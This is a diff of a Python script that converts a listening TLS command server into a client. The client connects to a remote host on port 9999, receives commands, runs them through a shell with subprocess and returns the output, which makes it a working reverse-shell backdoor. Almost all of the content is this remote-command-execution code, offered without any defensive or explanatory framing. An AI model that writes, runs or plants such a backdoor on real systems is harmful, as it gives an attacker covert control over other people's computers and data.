@@ -1,62 +1,53 @@
-from __future__ import print_function
+import os
 import socket
-import sys
+import subprocess
 import ssl
-cmd = ""
 
+# Create a socket
 def socket_create():
     try:
         global host
         global port
-        global s
-        host = ''
+        global ssls
+        host = '127.0.0.1'
         port = 9999
         s = socket.socket()
-        s = ssl.wrap_socket(s, certfile='ssl.crt', keyfile='ssl.key', ssl_version=ssl.PROTOCOL_TLSv1)
+        ssls = wrappedSocket = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
     except socket.error as msg:
         print("Socket creation error: " + str(msg))
 
 
-# Bind socket to port (the host and port the communication will take place) and wait for connection from client
-def socket_bind():
+# Connect to a remote socket
+def socket_connect():
     try:
         global host
         global port
         global s
-        print("Binding socket to port: " + str(port))
-        s.bind((host, port))
-        s.listen(5)
+        ssls.connect((host, port))
     except socket.error as msg:
-        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
-        socket_bind()
+        print("Socket connection error: " + str(msg))
 
 
-# Establish connection with client (socket must be listening for them)
-def socket_accept():
-    conn, address = s.accept()
-    print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
-    send_commands(conn)
-    conn.close()
-
-
-# Send commands
-def send_commands(conn):
+# Receive commands from remote server and run on local machine
+def receive_commands():
+    global s
     while True:
-        cmd = raw_input()
-        if cmd == 'quit':
-            conn.close()
-            s.close()
-            sys.exit()
-        if len(str.encode(cmd)) > 0:
-            conn.send(str.encode(cmd))
-            client_response = str(conn.recv(1024))
-            print(client_response, end="")
+        data = ssls.recv(1024)
+        if data[:2].decode("utf-8") == 'cd':
+            os.chdir(data[3:].decode("utf-8"))
+        if len(data) > 0:
+            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            output_bytes = cmd.stdout.read() + cmd.stderr.read()
+            output_str = str(output_bytes)
+            ssls.send(str.encode(output_str + str(os.getcwd()) + '> '))
+            print(output_str)
+    s.close()
 
 
 def main():
     socket_create()
-    socket_bind()
-    socket_accept()
+    socket_connect()
+    receive_commands()
 
 
 main()
